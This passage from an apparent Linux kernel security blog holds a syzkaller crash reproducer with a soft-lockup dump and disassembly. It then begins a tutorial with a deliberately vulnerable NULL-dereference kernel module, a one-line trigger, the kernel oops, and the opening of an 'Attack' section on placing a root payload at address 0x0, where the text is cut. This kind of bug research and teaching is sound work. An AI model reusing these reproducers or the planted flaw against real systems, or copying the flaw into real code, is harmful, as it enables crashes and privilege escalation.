counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop() {\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\tflush_tun();\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nuint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};\nvoid test()\n{\n\tlong res;memcpy((void*)0x20000280, \"/dev/loop-control\", 18);\n\tsyscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);\n\t*(uint64_t*)0x20000180 = 0;\n\t*(uint64_t*)0x20000188 = 0;\n\t*(uint64_t*)0x20000190 = 0;\n\t*(uint64_t*)0x20000198 = 0;\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000180, 0);\n\t*(uint64_t*)0x20000500 = 0x77359400;\n\t*(uint64_t*)0x20000508 = 0;\n\t*(uint64_t*)0x20000510 = 0;\n\t*(uint64_t*)0x20000518 = 0x989680;\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);\n\tres = syz_open_pts(-1, 0x42100);\n\tif (res != -1)\n\t\tr[0] = res;\n\tsyscall(__NR_ioctl, r[0], 0x5462, 0x20000140);\n\tsyscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);\n\tres = syscall(__NR_pipe2, 0x20000000, 0);\n\tif (res != -1) {\n\t\tr[1] = *(uint32_t*)0x20000000;\n\t\tr[2] = *(uint32_t*)0x20000004;\n\t}\n\t*(uint16_t*)0x20000040 = -1;\n\t*(uint16_t*)0x20000042 = 0x200;\n\t*(uint16_t*)0x20000044 = 0x8000;\n\t*(uint16_t*)0x20000046 = 0x3f;\n\t*(uint16_t*)0x20000048 = 0x22;\n\t*(uint16_t*)0x2000004a = 0x45f;\n\tsyscall(__NR_ioctl, r[1], 0x560a, 0x20000040);\n\tsyscall(__NR_fstatfs, r[1], 0x200000c0);\n\tsyz_open_pts(r[2], 0);\n\t*(uint32_t*)0x20000340 = 0x10;\n\tsyscall(__NR_accept, r[2], 0x20000300, 0x20000340);\n\tsyscall(__NR_fcntl, r[2], 4, 0x40400);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (;;) {\n\t\tif (chdir(cwd))\n\t\t\tfail(\"failed to chdir\");\n\t\tuse_temporary_dir();\n\t\tinitialize_tun();\n\t\tinitialize_netdevices();\n\t\tloop();\n\t}\n}\n```\n\n## default_idle - soft lockup\n\nIt just halted during booting.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#0 stuck for 153s! [swapper/0:0]\nModules linked in:\nirq event stamp: 5914346\nhardirqs last  enabled at (5914343): [<0000000098680cd3>] default_idle+0x18/0x2c0 arch/x86/kernel/process.c:354\nhardirqs last disabled at (5914344): [<00000000d4f96a97>] interrupt_entry+0xc0/0xe0 arch/x86/entry/entry_64.S:619\nsoftirqs last  enabled at (5914346): [<000000000af1e516>] irq_enter+0xb6/0xd0 kernel/softirq.c:347\nsoftirqs last disabled at (5914345): [<00000000b393087c>] irq_enter+0x9b/0xd0 kernel/softirq.c:351\nCPU: 0 PID: 0 Comm: swapper/0 Not tainted 4.16.0-rc3+ #4\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:native_safe_halt+0x2/0x10 arch/x86/include/asm/irqflags.h:54\nRSP: 0018:ffffffffa3607d88 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff12\nRAX: 0000000000000007 RBX: dffffc0000000000 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000001 RDI: ffffffffa362bdec\nRBP: 0000000000000000 R08: ffffffffa362b580 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000000 R12: ffffffffa3cb8ba0\nR13: 0000000000000000 R14: 0000000000000000 R15: ffffffffa3cb8c40\nFS:  0000000000000000(0000) GS:ffff88002e000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000000619570 CR3: 000000002a01e000 CR4: 00000000000006f0\nDR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000020000100\nDR3: 0000000020000100 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nCall Trace:\n arch_safe_halt arch/x86/include/asm/paravirt.h:94 [inline]\n default_idle+0x1d/0x2c0 arch/x86/kernel/process.c:354\n cpuidle_idle_call kernel/sched/idle.c:156 [inline]\n do_idle+0x233/0x2c0 kernel/sched/idle.c:246\n cpu_startup_entry+0xc6/0xd0 kernel/sched/idle.c:351\n start_kernel+0x840/0x880 init/main.c:717\n secondary_startup_64+0xa5/0xb0 arch/x86/kernel/head_64.S:239\nCode: 04 24 e8 12 ee ed fd 48 8b 04 24 e9 d6 fe ff ff 48 89 df e8 01 ee ed fd eb 8a 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 fb f4 <c3> 0f 1f 00 66 2e 0f 1f 84 00 00 00 00 00 f4 c3 90 90 90 90 90 \n```\n\n### Source Code\n\nHere's ```default_idle()``` ```/arch/x86/kernel/process.c``` in *v4.16.0-rc3*.\n\n```c\nvoid __cpuidle default_idle(void)\n{\n\ttrace_cpu_idle_rcuidle(1, smp_processor_id());\n\tsafe_halt();\n\ttrace_cpu_idle_rcuidle(PWR_EVENT_EXIT, smp_processor_id());\n}\n```\n\nAnd this is disassemble of compiled ```vmlinux``` with my ```.config```.\n\n```c\ngdb-peda$ pdisas default_idle\nDump of assembler code for function default_idle:\n   0xffffffff821acb10 <+0>:\t    push   r12\n   0xffffffff821acb12 <+2>:\t    push   rbp\n   0xffffffff821acb13 <+3>:\t    push   rbx\n   0xffffffff821acb14 <+4>:\t    mov    ebp,DWORD PTR gs:[rip+0x7de62615]        # 0xf130 <cpu_number>\n   0xffffffff821acb1b <+11>:\tnop    DWORD PTR [rax+rax*1+0x0]\n   0xffffffff821acb20 <+16>:\tcall   0xffffffff810f2370 <trace_hardirqs_on>\n   0xffffffff821acb25 <+21>:\tcall   QWORD PTR ds:0xffffffff82c406c0\n   0xffffffff821acb2c <+28>:\tmov    ebp,DWORD PTR gs:[rip+0x7de625fd]        # 0xf130 <cpu_number>\n   0xffffffff821acb33 <+35>:\tnop    DWORD PTR [rax+rax*1+0x0]\n   0xffffffff821acb38 <+40>:\tpop    rbx\n   0xffffffff821acb39 <+41>:\tpop    rbp\n   0xffffffff821acb3a <+42>:\tpop    r12\n   0xffffffff821acb3c <+44>:\tret    \n   0xffffffff821acb3d <+45>:\tmov    eax,DWORD PTR gs:[rip+0x7de625ec]        # 0xf130 <cpu_number>\n   0xffffffff821acb44 <+52>:\tmov    eax,eax\n   0xffffffff821acb46 <+54>:\tbt     QWORD PTR [rip+0xbf8b52],rax        # 0xffffffff82da56a0 <__cpu_online_mask>\n   0xffffffff821acb4e <+62>:\tjae    0xffffffff821acb38 <default_idle+40>\n   0xffffffff821acb50 <+64>:\tcall   0xffffffff8112fef0 <rcu_irq_enter_irqson>\n   0xffffffff821acb55 <+69>:\tinc    DWORD PTR gs:[rip+0x7de682b4]        # 0x14e10 <__preempt_count>\n   0xffffffff821acb5c <+76>:\tmov    rbx,QWORD PTR [rip+0xbad0a5]        # 0xffffffff82d59c08 <__tracepoint_cpu_idle+40>\n   0xffffffff821acb63 <+83>:\tcall   0xffffffff81124110 <debug_lockdep_rcu_enabled>\n   0xffffffff821acb68 <+88>:\ttest   eax,eax\n   0xffffffff821acb6a <+90>:\tje     0xffffffff821acb79 <default_idle+105>\n   0xffffffff821acb6c <+92>:\tcmp    BYTE PTR [rip+0xba8f9b],0x0        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acb73 <+99>:\tje     0xffffffff821acc22 <default_idle+274>\n   0xffffffff821acb79 <+105>:\ttest   rbx,rbx\n   0xffffffff821acb7c <+108>:\tje     0xffffffff821acba1 <default_idle+145>\n   0xffffffff821acb7e <+110>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acb81 <+113>:\tmov    r12d,0xffffffff\n   0xffffffff821acb87 <+119>:\tmov    rdi,QWORD PTR [rbx+0x8]\n   0xffffffff821acb8b <+123>:\tadd    rbx,0x18\n   0xffffffff821acb8f <+127>:\tmov    edx,ebp\n   0xffffffff821acb91 <+129>:\tmov    esi,r12d\n   0xffffffff821acb94 <+132>:\tcall   0xffffffff82403000 <__x86_indirect_thunk_rax>\n   0xffffffff821acb99 <+137>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acb9c <+140>:\ttest   rax,rax\n   0xffffffff821acb9f <+143>:\tjne    0xffffffff821acb87 <default_idle+119>\n   0xffffffff821acba1 <+145>:\tdec    DWORD PTR gs:[rip+0x7de68268]        # 0x14e10 <__preempt_count>\n   0xffffffff821acba8 <+152>:\tpop    rbx\n   0xffffffff821acba9 <+153>:\tpop    rbp\n   0xffffffff821acbaa <+154>:\tpop    r12\n   0xffffffff821acbac <+156>:\tjmp    0xffffffff8112fa80 <rcu_irq_exit_irqson>\n   0xffffffff821acbb1 <+161>:\tmov    eax,DWORD PTR gs:[rip+0x7de62578]        # 0xf130 <cpu_number>\n   0xffffffff821acbb8 <+168>:\tmov    eax,eax\n   0xffffffff821acbba <+170>:\tbt     QWORD PTR [rip+0xbf8ade],rax        # 0xffffffff82da56a0 <__cpu_online_mask>\n   0xffffffff821acbc2 <+178>:\tjae    0xffffffff821acb20 <default_idle+16>\n   0xffffffff821acbc8 <+184>:\tcall   0xffffffff8112fef0 <rcu_irq_enter_irqson>\n   0xffffffff821acbcd <+189>:\tinc    DWORD PTR gs:[rip+0x7de6823c]        # 0x14e10 <__preempt_count>\n   0xffffffff821acbd4 <+196>:\tmov    rbx,QWORD PTR [rip+0xbad02d]        # 0xffffffff82d59c08 <__tracepoint_cpu_idle+40>\n   0xffffffff821acbdb <+203>:\tcall   0xffffffff81124110 <debug_lockdep_rcu_enabled>\n   0xffffffff821acbe0 <+208>:\ttest   eax,eax\n   0xffffffff821acbe2 <+210>:\tje     0xffffffff821acbed <default_idle+221>\n   0xffffffff821acbe4 <+212>:\tcmp    BYTE PTR [rip+0xba8f23],0x0        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acbeb <+219>:\tje     0xffffffff821acc53 <default_idle+323>\n   0xffffffff821acbed <+221>:\ttest   rbx,rbx\n   0xffffffff821acbf0 <+224>:\tje     0xffffffff821acc11 <default_idle+257>\n   0xffffffff821acbf2 <+226>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acbf5 <+229>:\tmov    rdi,QWORD PTR [rbx+0x8]\n   0xffffffff821acbf9 <+233>:\tadd    rbx,0x18\n   0xffffffff821acbfd <+237>:\tmov    edx,ebp\n   0xffffffff821acbff <+239>:\tmov    esi,0x1\n   0xffffffff821acc04 <+244>:\tcall   0xffffffff82403000 <__x86_indirect_thunk_rax>\n   0xffffffff821acc09 <+249>:\tmov    rax,QWORD PTR [rbx]\n   0xffffffff821acc0c <+252>:\ttest   rax,rax\n   0xffffffff821acc0f <+255>:\tjne    0xffffffff821acbf5 <default_idle+229>\n   0xffffffff821acc11 <+257>:\tdec    DWORD PTR gs:[rip+0x7de681f8]        # 0x14e10 <__preempt_count>\n   0xffffffff821acc18 <+264>:\tcall   0xffffffff8112fa80 <rcu_irq_exit_irqson>\n   0xffffffff821acc1d <+269>:\tjmp    0xffffffff821acb20 <default_idle+16>\n   0xffffffff821acc22 <+274>:\tcall   0xffffffff811241a0 <rcu_read_lock_sched_held>\n   0xffffffff821acc27 <+279>:\ttest   eax,eax\n   0xffffffff821acc29 <+281>:\tjne    0xffffffff821acb79 <default_idle+105>\n   0xffffffff821acc2f <+287>:\tmov    rdx,0xffffffff82920580\n   0xffffffff821acc36 <+294>:\tmov    esi,0x28\n   0xffffffff821acc3b <+299>:\tmov    rdi,0xffffffff82925778\n   0xffffffff821acc42 <+306>:\tmov    BYTE PTR [rip+0xba8ec5],0x1        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acc49 <+313>:\tcall   0xffffffff810f59ee <lockdep_rcu_suspicious>\n   0xffffffff821acc4e <+318>:\tjmp    0xffffffff821acb79 <default_idle+105>\n   0xffffffff821acc53 <+323>:\tcall   0xffffffff811241a0 <rcu_read_lock_sched_held>\n   0xffffffff821acc58 <+328>:\ttest   eax,eax\n   0xffffffff821acc5a <+330>:\tjne    0xffffffff821acbed <default_idle+221>\n   0xffffffff821acc5c <+332>:\tmov    rdx,0xffffffff82920580\n   0xffffffff821acc63 <+339>:\tmov    esi,0x28\n   0xffffffff821acc68 <+344>:\tmov    rdi,0xffffffff82925778\n   0xffffffff821acc6f <+351>:\tmov    BYTE PTR [rip+0xba8e98],0x1        # 0xffffffff82d55b0e <__warned.41319>\n   0xffffffff821acc76 <+358>:\tcall   0xffffffff810f59ee <lockdep_rcu_suspicious>\n   0xffffffff821acc7b <+363>:\tjmp    0xffffffff821acbed <default_idle+221>\nEnd of assembler dump.\n```\n\nCode :\n\n```c\n   0:   04 24                   add    al,0x24\n   2:   e8 12 ee ed fd          call   0xfffffffffdedee19\n   7:   48 8b 04 24             mov    rax,QWORD PTR [rsp]\n   b:   e9 d6 fe ff ff          jmp    0xfffffffffffffee6\n  10:   48 89 df                mov    rdi,rbx\n  13:   e8 01 ee ed fd          call   0xfffffffffdedee19\n  18:   eb 8a                   jmp    0xffffffffffffffa4\n  1a:   90                      nop\n  1b:   90                      nop\n  1c:   90                      nop\n  1d:   90                      nop\n  1e:   90                      nop\n  1f:   90                      nop\n  20:   90                      nop\n  21:   90                      nop\n  22:   90                      nop\n  23:   90                      nop\n  24:   90                      nop\n  25:   90                      nop\n  26:   90                      nop\n  27:   90                      nop\n  28:   90                      nop\n  29:   fb                      sti    \n  2a:   f4                      hlt    \n  2b:  *c3                      ret    \n  2c:   0f 1f 00                nop    DWORD PTR [rax]\n  2f:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]\n  36:   00 00 00 \n  39:   f4                      hlt    \n  3a:   c3                      ret    \n  3b:   90                      nop\n  3c:   90                      nop\n  3d:   90                      nop\n  3e:   90                      nop\n  3f:   90                      nop\n```\n\nMaybe, in ```safe_halt()```, stuck for seconds because of ...\n\n**End**\n\n\n\n## ","excerpt":"handle_irq - OOBs Call Trace (Dump) PoC funny, just one call, . do_irq - alloca Out Of Bounds Call Trace (Dump) PoC generated by syz-repro.…","fields":{"slug":"/2018-03-Founds/"},"frontmatter":{"date":"Mar 01, 2018","title":"Linux Kernel - 2018-03 Founds","tags":["Security","Linux-Kernel"],"update":"Mar 30, 2018"},"timeToRead":62}},{"node":{"rawMarkdownBody":"\n## Case\n\nLet's get down to the point this time. I'll give an example code that has a NULL dereference vulnerability.\nThe testing Environment is like below.\n\n```c\nzero@ubuntu:~$ uname -a\nLinux ubuntu 4.16.0-041600rc1-generic #201802120030 SMP Mon Feb 12 00:31:33 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nzero@ubuntu:~$ lsb_release -a\nNo LSB modules are available.\nDistributor ID:\tUbuntu\nDescription:\tUbuntu Bionic Beaver (development branch)\nRelease:\t18.04\nCodename:\tbionic\nzero@ubuntu:~$ uname -a\nLinux ubuntu 4.16.0-041600rc1-generic #201802120030 SMP Mon Feb 12 00:31:33 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\nzero@ubuntu:~$ gcc -v\n...\ngcc version 7.3.0 (Ubuntu 7.3.0-3ubuntu1)\n```\n\n## Code\n\nHere's a Makefile & vulnerable code.\n\n```c\nobj-m += bug1.o\n\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n```\n\n\n```c\n#include <linux/init.h>\n#include <linux/module.h> \n#include <linux/proc_fs.h>\n#include <linux/kernel.h>\n\nvoid (* vptr)(void);\nstatic struct proc_dir_entry *my_proc = NULL;\n\nstatic ssize_t my_write(struct file *file, const char *buf, size_t len, loff_t *data) {\n    vptr();\n    return len;\n}\n\nstatic const struct file_operations fops = {\n    .owner = THIS_MODULE,\n    .write = my_write\n};\n\nvoid __exit my_exit_module(void) {\n    remove_proc_entry(\"bug1\", NULL);\n    printk(\"[-] bug1 module unloaded\\n\");\n}\n\nint __init my_init_module(void) {\n    my_proc = proc_create(\"bug1\", 0666, NULL, &fops);\n    \n    if(my_proc == NULL)\n        return -ENOMEM;\n    \n    printk(\"[+] bug1 module loaded\\n\");\n    return 0;    \n}\n\nmodule_init(my_init_module);\nmodule_exit(my_exit_module);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"zer0day\");\nMODULE_DESCRIPTION(\"null dereference test 1\");\n```\n\nClearly, we can notice that there's a NULL dereference vulnerability because of uninitialized pointer.\nSo, for triggering NULL dereference, we just simply call write function.\n\nFirst, compile a code & add a kernel module into the kernel by following command.\n\n```c\nzero@ubuntu:~/Desktop/LK/bug1$ make all\n...\nzero@ubuntu:~/Desktop/LK/bug1$ sudo insmod bug1.ko\n```\n\nThen. you can see a dmesg message\n\n```c\n...\n[ 8111.815103] [+] bug1 module loaded\n``` \n\n## Bug\n\nThe kernel module is loaded, then, let's trigger the bug! \n\n```c\nzero@ubuntu:~/Desktop/LK/bug1$ echo asdf > /proc/bug1\n```\n\nThen, you can also see a dmesg like below.\n\n```c\n[ 8123.452479] BUG: unable to handle kernel NULL pointer dereference at           (null)\n[ 8123.452483] IP:           (null)\n[ 8123.452484] PGD 0 P4D 0 \n[ 8123.452486] Oops: 0010 [#1] SMP PTI\n[ 8123.452490] Modules linked in: bug1(OE) crct10dif_pclmul crc32_pclmul ghash_clmulni_intel pcbc aesni_intel aes_x86_64 crypto_simd glue_helper cryptd vmw_balloon intel_rapl_perf snd_ens1371 snd_ac97_codec gameport ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event snd_rawmidi snd_seq snd_seq_device snd_timer snd soundcore input_leds joydev serio_raw shpchp vmw_vsock_vmci_transport vsock vmw_vmci mac_hid binfmt_misc sch_fq_codel parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic usbhid hid vmwgfx psmouse ttm drm_kms_helper syscopyarea sysfillrect mptspi sysimgblt ahci mptscsih fb_sys_fops libahci mptbase drm e1000 scsi_transport_spi i2c_piix4 pata_acpi\n[ 8123.452519] CPU: 0 PID: 2630 Comm: bash Tainted: G           OE    4.16.0-041600rc1-generic #201802120030\n[ 8123.452520] Hardware name: VMware, Inc. VMware Virtual Platform/440BX Desktop Reference Platform, BIOS 6.00 05/19/2017\n[ 8123.452521] RIP: 0010:          (null)\n[ 8123.452522] RSP: 0018:ffffb2ca82c63df0 EFLAGS: 00010286\n[ 8123.452523] RAX: 0000000000000000 RBX: 0000000000000005 RCX: ffffb2ca82c63ef8\n[ 8123.452524] RDX: 0000000000000005 RSI: 000055eaa6926008 RDI: ffff90717336c800\n[ 8123.452525] RBP: ffffb2ca82c63e00 R08: 0000000000000000 R09: 0000000000000001\n[ 8123.452525] R10: 0000000000000073 R11: 0000000000000246 R12: fffffffffffffffb\n[ 8123.452526] R13: ffffb2ca82c63ef8 R14: 000055eaa6926008 R15: ffff90717336c800\n[ 8123.452527] FS:  00007f225ba2db80(0000) GS:ffff907239600000(0000) knlGS:0000000000000000\n[ 8123.452528] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n[ 8123.452529] CR2: 0000000000000000 CR3: 0000000094256005 CR4: 00000000003606f0\n[ 8123.452550] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[ 8123.452551] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400\n[ 8123.452551] Call Trace:\n[ 8123.452556]  ? my_write+0x19/0x1f [bug1]\n[ 8123.452630]  proc_reg_write+0x41/0x70\n[ 8123.452646]  __vfs_write+0x3a/0x170\n[ 8123.452651]  ? common_file_perm+0x50/0x140\n[ 8123.452652]  ? apparmor_file_permission+0x1a/0x20\n[ 8123.452656]  ? security_file_permission+0x41/0xc0\n[ 8123.452662]  ? _cond_resched+0x19/0x40\n[ 8123.452663]  vfs_write+0xb1/0x1a0\n[ 8123.452665]  SyS_write+0x55/0xc0\n[ 8123.452670]  do_syscall_64+0x76/0x130\n[ 8123.452671]  entry_SYSCALL_64_after_hwframe+0x21/0x86\n[ 8123.452673] RIP: 0033:0x7f225b115054\n[ 8123.452674] RSP: 002b:00007ffcc697c628 EFLAGS: 00000246 ORIG_RAX: 0000000000000001\n[ 8123.452675] RAX: ffffffffffffffda RBX: 0000000000000005 RCX: 00007f225b115054\n[ 8123.452675] RDX: 0000000000000005 RSI: 000055eaa6926008 RDI: 0000000000000001\n[ 8123.452676] RBP: 000055eaa6926008 R08: 000055eaa6934ca8 R09: 0000000000000004\n[ 8123.452677] R10: 0000000000000073 R11: 0000000000000246 R12: 0000000000000005\n[ 8123.452678] R13: 0000000000000001 R14: 00007f225b3ec720 R15: 00007f225b3e83e0\n[ 8123.452679] Code:  Bad RIP value.\n[ 8123.452682] RIP:           (null) RSP: ffffb2ca82c63df0\n[ 8123.452683] CR2: 0000000000000000\n[ 8123.452685] ---[ end trace b8845159e5bb387e ]---\n```\n\nRIP is successfully changed into NULL ptr.\n\n## Attack\n\nNULL dereference is triggered, then. next level is just simply inserting a payload which gains root privileges to 0x0.\n\nBut, in modern LK, default mmap min address is 65536, meaning that pre-setting min address to 0 for test.\n\n```c\nzero@ubuntu:~/Desktop/LK/bug1$ sudo sysctl -w 